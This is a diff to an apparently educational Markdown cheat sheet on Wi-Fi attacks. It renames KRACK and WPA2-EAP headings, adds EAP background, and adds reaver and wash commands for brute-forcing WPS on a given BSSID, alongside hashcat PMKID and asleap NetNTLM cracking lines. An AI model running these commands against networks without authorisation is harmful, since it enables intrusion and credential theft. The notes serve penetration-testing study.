@@ -58,11 +58,12 @@
       - [WPA2 App Less Attack](#wpa2-app-less-attack)
       - [KARMA Attack](#karma-attack)
       - [PMKID Attack](#pmkid-attack)
-      - [KRACK Attack](#krack-attack)
+      - [Key Reinstallation Attack (KRACK)](#key-reinstallation-attack-krack)
       - [FRAG Attack](#frag-attack)
     - [WPA2 Enterprise](#wpa2-enterprise)
       - [WPA2-EAP - Password spray attack](#wpa2-eap---password-spray-attack)
-      - [WPA2 Evil Twin Attack](#wpa2-evil-twin-attack)
+      - [WPA2-EAP Evil Twin Attack](#wpa2-eap-evil-twin-attack)
+      - [WPA2-EAP Relay](#wpa2-eap-relay)
   - [WPA3](#wpa3)
       - [ZKP - Zero Knowledge Proof](#zkp---zero-knowledge-proof)
     - [Use WPA3-SAE authentication on Linux](#use-wpa3-sae-authentication-on-linux)
@@ -376,6 +377,20 @@ Checking within a capture the WLAN with WPS enable
 wps.wifi_protected_setup_state==2
 ```
 
+Install reaver
+```
+sudo apt install reaver
+```
+
+Identify device using WPS
+```
+sudo wash -i wlx00c0ca996340
+```
+
+Attacking specific BSSID
+```
+sudo reaver -i wlx00c0ca996340 -c 1 -b C0:3C:04:02:16:48 -vv
+```
 
 ## Guest Network
 
@@ -640,7 +655,7 @@ Cracking PMKID hashes using hashcat (newer version of hashcat -m 22000)
 hashcat -a 0 -m 16800 pmkid.txt ../../wordlists/wordlistsOnex/
 ```
 
-#### KRACK Attack
+#### Key Reinstallation Attack (KRACK)
 - https://www.krackattacks.com/
 KRAKC attack or Key Reinstallation Attack
 
@@ -648,10 +663,16 @@ KRAKC attack or Key Reinstallation Attack
 
 ### WPA2 Enterprise
 
+- EAP : Extended Authentication Protocol
+- RFC : https://www.rfc-editor.org/rfc/rfc5247.html
+- 802.1X : EAP adopted by 802.11
+
+<img src="./images/eap.png" width="500"/>
+
 #### WPA2-EAP - Password spray attack
 - https://mikeallen.org/blog/2016-10-06-breaking-into-wpa-enterprise-networks-with-air-hammer/
 
-#### WPA2 Evil Twin Attack
+#### WPA2-EAP Evil Twin Attack
 
 Create an identical fake certificate for authentication server.
 ```
@@ -668,6 +689,8 @@ Cracking the NetNTLM challenge using asleap
 ```
 asleap -C 06:9b:40:83:37:90:fd:41 -R 27:63:33:83:e7:25:98:5e:6d:4f:ed:73:b9:c5:1a:cc:91:13:bc:f9:13:95:30:56 -W ../wordlists/100-common-passwords.txt
 ```
+
+#### WPA2-EAP Relay
 
 ## WPA3
 The major improvement of WPA3 is a improved handshake (*Dragonfly-Handshake*) that makes it impossible for attackers to record the *4-Way Handshake* and launch a offline dictionary attack.  
